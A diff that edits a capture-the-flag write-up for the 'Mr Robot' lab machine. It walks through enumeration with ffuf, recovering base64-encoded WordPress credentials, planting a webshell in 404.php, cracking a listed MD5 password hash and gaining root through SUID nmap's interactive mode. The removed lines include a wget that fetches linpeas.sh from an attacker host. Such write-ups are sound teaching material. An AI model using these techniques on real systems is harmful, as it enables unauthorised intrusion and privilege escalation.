@@ -34,7 +34,12 @@ Nmap done: 1 IP address (1 host up) scanned in 30.18 seconds
 
 ```
 
+Accessing the main page, I got the following page.
+
+<figure><img src="mr-robot-1.png" alt=""><figcaption></figcaption></figure>
 ## Enumeration
+
+I started the enumeration by running `ffuf` and I noticed that the applications is using wordpress.
 
 ```
 $ ffuf -u http://10.65.172.144/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
@@ -81,47 +86,44 @@ wp-login        [Status: 200, Size: 2613, Words: 115, Lines: 53, Duration: 420ms
 atom            [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 407ms]
 robots          [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 148ms]
 license         [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 271ms]
-intro         [Status: 200, Size: 5163, Words: 9076, Lines: 228, Duration: 154ms]
-Image         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 410ms]
-IMAGE         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 374ms]
-rss2          [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 396ms]
-readme        [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 148ms]
-rdf           [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 386ms]
-0000          [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 386ms]
-wp-config     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 438ms]
-page1         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 433ms]
+								...
 ```
 
-On `robots` page,
-
-<figure><img src="mr-robot-1.png" alt=""><figcaption></figcaption></figure>
-
+We got the first flag on `robots` page.
 
 <figure><img src="mr-robot-2.png" alt=""><figcaption></figcaption></figure>
 
-```
-http://10.65.172.144/fsocity.dic
-```
+Reading `license` directory, we can have a clue encoded in base64.
+
+<figure><img src="mr-robot-3.png" alt=""><figcaption></figcaption></figure>
+
+Decoding it, we have elliot's credentials.
+
+<figure><img src="mr-robot-4.png" alt=""><figcaption></figcaption></figure>
+
+Using this, we can access wordpress. Since I was able to edit files, I wrote a webshell to gain access.
+
+<figure><img src="mr-robot-5.png" alt=""><figcaption></figcaption></figure>
+
+By accessing `404.php` page, I got a shell.
+
+<figure><img src="mr-robot-6.png" alt=""><figcaption></figcaption></figure>
+
+I was unable to read the second flag `key-2-of-3.txt`. I had to use a tool to discover the content of `password.raw-md5`. After discover this, I was able to login as `robot` and read the flag.
+
+<figure><img src="mr-robot-7.png" alt=""><figcaption></figcaption></figure>
 
 
-```
-daemon@ip-10-64-139-74:/home$ cd robot/
-daemon@ip-10-64-139-74:/home/robot$ ls
-key-2-of-3.txt  password.raw-md5
-daemon@ip-10-64-139-74:/home/robot$ cat key-2-of-3.txt 
-cat: key-2-of-3.txt: Permission denied
-daemon@ip-10-64-139-74:/home/robot$ cat password.raw-md5
-robot:c3fcd3d76192e4007dfb496cca67e13b
-```
+<figure><img src="mr-robot-8.png" alt=""><figcaption></figcaption></figure>
 
+Running linpeas script, I found a SUID `nmap`. 
 
-```
-daemon@ip-10-64-139-74:/home/robot$ su robot
-Password: 
-$ whoami
-robot
-```
+<figure><img src="mr-robot-9.png" alt=""><figcaption></figcaption></figure>
 
-```
-daemon@ip-10-64-139-74:/home/robot$ wget http://192.168.183.77:8000/linpeas.sh -O linpeas.sh
-```
+Checking on GTFOBIns, I noticed that we can get a root running the command `nmap --interactive`.
+
+<figure><img src="mr-robot-10.png" alt=""><figcaption></figcaption></figure>
+
+Since I'm root, I was able to read the final flag `key-3-of-3.txt`.
+
+<figure><img src="mr-robot-11.png" alt=""><figcaption></figcaption></figure>
